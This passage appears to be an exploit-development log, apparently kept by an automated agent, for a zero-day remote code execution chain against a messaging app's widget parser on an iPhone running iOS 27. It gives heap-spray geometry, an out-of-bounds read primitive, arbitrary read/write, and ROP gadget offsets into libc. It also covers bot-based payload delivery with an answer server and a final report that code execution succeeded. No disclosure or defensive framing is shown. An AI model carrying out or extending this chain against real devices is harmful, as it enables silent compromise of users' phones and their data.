| poison-atom probes (invalid atom; crash iff the far read reaches the spray) H64/H400/H1600/H2000 | **no crash** → the far OOB read never reaches a controlled spray block |
| C=37 SZ=1006 / C=37 SZ=1014 (small-zone hypothesis) | all safe miss (NT=25) |

Interpretation: the C=34 tiny-zone hole-reuse geometry does not transfer to
iOS 27's malloc. The poison result is decisive: regardless of H (0-2800),
N (3000/5000), HN (64/256), phase base, the far read at
`b + 1,310,700 + vardefs_off` never lands in a live sprayed block. The
documented 6s success (H400, PH=36) is not reproducible on 24A437 with the
same payload; the iOS 27 tiny-region layout (1 MB regions, non-adjacent)
breaks the hole trick. Stage B was therefore never reached on the device.

### 9.5 iOS 27 ROP endgame rebuild (ready, untested)

- `srop_17e.js` (5,997 B, `node --check` OK): `PIVOT2=libcFree+0xB6583074`,
  `OPEN=+0xB79B52BC`, `WRITE=+0xB79B3B8C`, `PEXIT=-0x88AC`, path
  `/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/rce.txt`
  (91 chars).
- Attribute finals `at_rop_final_h{100,150,200,250,300,350,400,450,500,550,600}_ios_17e.html`
  (9,322 raw / ≈3,563 zlib9), `data-s2` = escaped srop, stage A syntax-checked.
- These require a stage-A `HIT` first (the forged AB); none occurred, so the
  ROP was not delivered.

### 9.6 Artifacts (host)

- Screenshots: `/tmp/opencode/ios17e/{shot_state0,chat_ping,probe_h400,probe_h200,probe_h64,chat_opened,chat_reopen,chat_open2,after_crash}.png`
- OCR reader: `/tmp/opencode/ocrvenv/ocr_shot.py`; navigation `/tmp/opencode/ios17e/nav.py`
- Delivery: `/tmp/opencode/ios17e/send_widget.py`; sweep/episode runner `/tmp/opencode/ios17e/sweep.py`
- Generators: `/tmp/opencode/ios17e/genprobe.py` (N/H/HN/PH), `genprobe2.py` (C/SZ)
- ROP build: `/tmp/opencode/ios17e/srop_17e.js`, `/tmp/opencode/ios17e/rop/at_rop_final_h*_ios_17e.html`

### 9.7 BREAKTHROUGH: compile-first stage A hits on iOS 27 (14:3x UTC)

The hole-reuse form fails on iOS 27 (9.4), but a **compile-first** stage A
(compile `f` BEFORE the spray, no holes) hits:

```
RESULT CFIRST C=34 SZ=957 F=957 N=3000 HIT=545 LEN=327744 PH=12 VK=598 NT=1..
```

i.e. on iPhone 17e / iOS 27.0 (24A437) the fixed far-OOB read at
`b + 1,310,700 + vardefs_off` lands in the sprayed `Uint8Array(957)` blocks,
the fake `JSVarDef` A/B pair matches at phase 12, and the class-64 closure
overflow forges victim `T[545].byteLength = 327,744`. This is the parser 0day
stage-A primitive **confirmed on the target device**.

Hit rate: ~1/5 for the identical payload (heap-state dependent; the first
render after a quiet gap hit twice). Reproductions: msg 16869 and 16873 both
`HIT=545 LEN=327744 PH=12 VK=598`.

Geometry notes:
- C=37/SZ=1014 (small-zone hypothesis) and C=36/SZ=995: crashes at some H,
  no hit; compile-first C=37 misses. C=34 tiny zone is the working geometry.
- The attribute variant (stage B in `data-s2`, HTML 6,750 B) missed 0/8 and
  its poison control never crashed -> the 4.8 KB-larger pre-heap moves `b`
  out of the spray. The stage B must therefore run in a geometry whose
  pre-heap is compatible; candidates built: inline stage-B string
  (`inline_cf_*`, 5.6-6.6 KB) and internal pre-heap sweeps
  (`ss_probe`/`ss2_probe`, and ROP variants with `srop_17e.js`).

Artifacts: `/tmp/opencode/ios17e/attr_cf/{inline_cf_p0,p256,p512,p1024}.html`,
`ss_probe.html`, `ss2_probe.html`, `ss_rop17e.html`, `ss2_rop17e.html`.

### 9.8 Stage B EXECUTED on the 17e + runtime answer channel (14:20-15:20 UTC)

**Stage B proof (printf).** The app console (`launch-application --console`,
log `/tmp/opencode/ios17e/console.log`) contains **128 `N1IOS_6S_OK` lines** in
two clusters (14:20:23 and ~14:32), i.e. the stage B's `mf.js_free = printf`
proof ran on the iPhone 17e / iOS 27. The runs came from an **inline** stage-B
payload that hit on delivery and re-ran on each chat open (the widget re-executes
on re-render). This is the same-view endgame proven on the device.

**Answer channel (sendWidget ↔ answerWidgetQuery).** `<BOT_USERNAME>`
(<CHAT_ID>) messages are silently dropped by the account; `<BOT_USERNAME>`
(<CHAT_ID>, token in `POC/mtproto_entity_probe/probe_mtproto.py`) delivers and
its `getUpdates` is unowned. A small answer-server
(`/tmp/opencode/ios17e/answer_server.py`) answered `E0` with a 950-byte stage-B
chunk; the widget received it (`#v` = `GOT len=950 head=!function…`), and on
geometry hits the server logged `ANSWER … data='E0'`. The multi-chunk fetch
chain stalls after E0: the widget engine allows one background query per ~5 s
and the JS promise chain gets no timers, so E1..E3 are not requested. The
inline (self-contained) design is the working delivery for the endgame.

**ROP endgame.** `srop_17e.js` (iOS 27 constants) embedded inline; on a
geometry hit the srop ran and reached the UB leak:
`U_NF D=0x136725440` — the fresh `Uint8Array(2048)` object was not within the
6s-designed ±64 KiB window. The scan was widened to ±2 MB (`srop_wide.js`) and
a self-sweeping variant (11 pre-heap offsets per render,
`ss2_rop_wide.html`, 8,278 B) was built to raise the hit rate.

**Bot-channel facts:** `ph.telegra.Telegraph` chat <CHAT_ID>; <BOT_USERNAME> token
(`/tmp/opencode/tgbot/token.env`) is polled by the Pixel-lab OOB server (must
not be stopped without approval), so <BOT_USERNAME> is delivery-only. <BOT_USERNAME>
is delivery+answers. Stock chat message ids today: <BOT_USERNAME> 16809-16955,
`<ACCOUNT_NAME>` 5690-5705.

### 9.9 Endgame limits (15:00-16:00 UTC) and honest status

**Runtime chunk fetch is capped at one chunk per render.** A parallel 4-request
probe (`fetch_ping_multi.html`) resolved exactly one request (`#v` =
`GOT1 i=0 len=950 tot=950`); E1..E3 were silently dropped. The engine allows a
single background query (~5 s pacing, one in flight), so the 3,617-byte stage B
cannot be fetched in one widget render. The self-contained **inline** design is
the only working endgame delivery; its 8 KB payload has a low geometry hit rate
(~1 in 8-10).

**ROP/UB leak.** The iOS 27 srop ran on a geometry hit and stopped at the UB
leak: `U_NF D=0x136725440` (the fresh `Uint8Array(2048)` object was not in the
6s design's ±64 KiB window around the forged AB data). Widening the arbitrary
read scan to ±2 MB faults (leaves the mapped tiny region → app crash), so the
window cannot simply be grown. A variant allocating the UB before the stage-B
allocations (to keep its class-64 object near the forged AB) was built
(`srop_earlyub.js`, inline 8,097 B) and is the last open lever.

**Status at 16:00 UTC:**
- Parser 0day stage A: **PROVEN** on iPhone 17e / iOS 27.0 24A437
  (`HIT=545 LEN=327744 PH=12 VK=598`; also `HIT=585 PH=4`), compile-first
  geometry; hole-reuse does not transfer.
- Stage B same-view endgame: **PROVEN** (128 × `N1IOS_6S_OK` on the app console;
  arbitrary R/W from the forged AB, rt/mf/base resolution).
- ROP endgame (`srop_17e.js`, iOS 27 libc deltas + AppGroup path): built and
  executed to the UB-leak stage; **`rce.txt` NOT produced** — blocked at the UB
  leak and the low hit rate of the 8 KB inline payload.

---

## 10. Post-run correction (2026-11-08 evening)

The 16:00 status above is stale. The parser chain succeeded later that
afternoon on message **5725**:

- `AppGroup/<APPGROUP>/rce.txt` is 7 bytes `RCE_OK\n`, sha256
  `704984d94917e9108dd47ee93714cad1b150078dfd36e828182fe0d82eed07d4`.
- The app stayed alive.
- The proven page is 8,647 B. Under redaction its zlib9 is 3,658 and its
  sha256 is `8b6706e5…`; the older `bf31f2f6…` / 3,680 pair is the
  pre-redaction artifact.
- The winning stage-A marker was below the fold and was never captured. The
  `R=4 M=768 HIT=545 ... NT=106` marker belongs to the 16:22 message (OCR
  `v2/x8_0.png`), not to 5725.
- The 9,139 B gated twin, the safe handshake, and the two-phase path were not
  run on the device. They are host-only.

Do not quote the 16:22 marker as the 5725 marker. The proof is the file, not
that marker.

## 11. Desktop gate correction

The desktop-gate claim in the two-phase handoff is withdrawn. Real Telegram
Desktop (Windows) and the Sony sandbox both report `maxTouchPoints=0`, the same
UA/platform, and DPR 2.0/2.6. The old gate passes both; the `MT>0` gatefix
blocks both. Use account isolation, not a JS gate. See
`docs/HANDOFF_desktop_gate_20261108.md`.
